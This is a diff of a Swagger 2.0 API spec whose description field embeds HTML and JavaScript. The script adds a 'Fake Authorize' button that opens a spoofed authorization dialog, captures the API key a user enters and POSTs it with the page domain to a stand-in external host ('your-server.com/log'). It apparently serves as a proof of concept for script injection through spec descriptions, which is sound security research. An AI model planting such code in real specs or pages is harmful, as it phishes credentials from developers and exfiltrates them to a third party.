@@ -2,59 +2,54 @@ swagger: '2.0'
 info:
   title: Custom Authorization UI
   description: |
+    <div style="margin-top: 20px;">
+      <button id="customAuthButton" style="background-color: #61affe; color: white; padding: 8px 15px; border: none; border-radius: 5px; font-size: 14px; cursor: pointer;">
+        Fake Authorize
+      </button>
+    </div>
+    
     <script>
       document.addEventListener("DOMContentLoaded", function() {
-        // Create a new custom button and style it to resemble Swagger UI's buttons
-        const customAuthButton = document.createElement('button');
-        customAuthButton.textContent = "Fake Authorize";
-        customAuthButton.style = "background-color: #61affe; color: white; padding: 8px 15px; border: none; border-radius: 5px; font-size: 14px; cursor: pointer; margin: 10px;";
-        
-        // Insert the custom button into the Swagger UI
-        const targetElement = document.querySelector('.swagger-ui .auth-wrapper');
-        if (targetElement) {
-          targetElement.appendChild(customAuthButton);
+        var button = document.getElementById("customAuthButton");
+        if (button) {
+          button.onclick = function() {
+            // Create a fake authorization popup
+            var fakePopup = document.createElement('div');
+            fakePopup.innerHTML = `
+              <div style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background-color: white; padding: 20px; border: 2px solid #ccc; z-index: 9999; max-width: 400px; text-align: center;">
+                <h3>Custom API Key Authorization</h3>
+                <p>Enter your API Key below:</p>
+                <input id="fakeKeyInput" type="text" style="width: 100%; padding: 8px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 4px;" placeholder="api_key">
+                <button id="submitFakeKey" style="background-color: #4CAF50; color: white; padding: 8px 15px; border: none; border-radius: 5px; cursor: pointer; margin-right: 10px;">Authorize</button>
+                <button id="cancelFakeKey" style="background-color: #f44336; color: white; padding: 8px 15px; border: none; border-radius: 5px; cursor: pointer;">Cancel</button>
+              </div>
+            `;
+            document.body.appendChild(fakePopup);
+
+            // Capture API key when "Authorize" button is clicked
+            document.getElementById("submitFakeKey").onclick = function() {
+              var apiKey = document.getElementById("fakeKeyInput").value;
+              console.log('Captured API Key:', apiKey);
+
+              // Optional: Send API key to an external server
+              fetch('https://your-server.com/log', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  domain: document.domain,
+                  apiKey: apiKey
+                })
+              });
+
+              alert('API Key: ' + apiKey + '\nDomain: ' + document.domain);
+              document.body.removeChild(fakePopup);
+            };
+
+            // Close popup when "Cancel" button is clicked
+            document.getElementById("cancelFakeKey").onclick = function() {
+              document.body.removeChild(fakePopup);
+            };
+          };
         }
-
-        // Define what happens when the custom button is clicked
-        customAuthButton.onclick = function() {
-          // Create a fake popup similar to the real authorization dialog
-          const fakePopup = document.createElement('div');
-          fakePopup.innerHTML = `
-            <div style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background-color: white; padding: 20px; border: 2px solid #ccc; z-index: 9999; max-width: 400px; text-align: center;">
-              <h3>Custom Api Key Authorization</h3>
-              <p>Enter your API Key below:</p>
-              <input id="fakeKeyInput" type="text" style="width: 100%; padding: 8px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 4px;" placeholder="api_key">
-              <button id="submitFakeKey" style="background-color: #4CAF50; color: white; padding: 8px 15px; border: none; border-radius: 5px; cursor: pointer; margin-right: 10px;">Authorize</button>
-              <button id="cancelFakeKey" style="background-color: #f44336; color: white; padding: 8px 15px; border: none; border-radius: 5px; cursor: pointer;">Cancel</button>
-            </div>
-          `;
-          document.body.appendChild(fakePopup);
-
-          // Handle the fake "Authorize" button click
-          document.getElementById('submitFakeKey').onclick = function() {
-            const apiKey = document.getElementById('fakeKeyInput').value;
-            console.log('Captured API Key:', apiKey);
-
-            // Optionally, send the captured API key to an external server
-            fetch('https://your-server.com/log', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                domain: document.domain,
-                apiKey: apiKey
-              })
-            });
-
-            alert('API Key: ' + apiKey + '\nDomain: ' + document.domain);
-
-            // Close the fake popup
-            document.body.removeChild(fakePopup);
-          };
-
-          // Handle the cancel button
-          document.getElementById('cancelFakeKey').onclick = function() {
-            document.body.removeChild(fakePopup);
-          };
-        };
       });
     </script>
